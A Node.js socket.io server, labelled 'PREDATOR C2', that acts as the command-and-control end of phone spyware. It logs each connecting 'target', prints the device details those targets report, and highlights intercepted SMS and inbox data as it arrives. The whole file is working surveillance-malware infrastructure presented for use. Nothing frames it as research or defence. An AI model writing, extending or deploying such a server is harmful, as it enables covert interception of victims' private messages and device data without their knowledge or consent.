const http = require('http');
const server = http.createServer((req, res) => {
    res.writeHead(200);
    res.end("PREDATOR SYSTEM ACTIVE 🚀");
});

const io = require('socket.io')(server, {
    // ✅ Timeout ko 10 sec rakho taki network fluctuations jhel sake
    pingTimeout: 10000,   
    pingInterval: 5000,   
    transports: ['websocket', 'polling'],
    cors: { origin: "*" }
});

console.log("-----------------------------------------");
console.log("💀 PREDATOR C2: UNIVERSAL MONITORING 💀");
console.log("Status: Extreme Speed & Stability Active");
console.log("-----------------------------------------");

io.on('connection', (socket) => {
    // Naya target aate hi identify karo
    console.log(`\n[+] LIVE CONNECTION: ${socket.id}`);

    socket.on("device_info", (info) => {
        console.log("📱 DEVICE IDENTIFIED: " + info);
    });

    socket.on('phone_data', (packet) => {
        const time = new Date().toLocaleTimeString();
        
        // SMS ya INBOX aate hi terminal highlight karo
        if (packet.includes("SMS") || packet.includes("INBOX")) {
            console.log(`\n\n=========================================`);
            console.log(`[${time}] 🚨 ALERT: ${packet}`);
            console.log(`=========================================\n`);
        } 
        // Battery ko static rakho taaki terminal clean rahe
        else if (packet.includes("BATTERY")) {
            process.stdout.write(`\r[${time}] 🔋 STATUS: ${packet}          `);
        }
    });

    socket.on('disconnect', (reason) => {
        console.log(`\n[-] Target Offline (Reason: ${reason})`);
    });
});

// Port 3000 par listening
server.listen(3000, '0.0.0.0', () => {
    console.log("C2 Server is running on Port 3000...");
});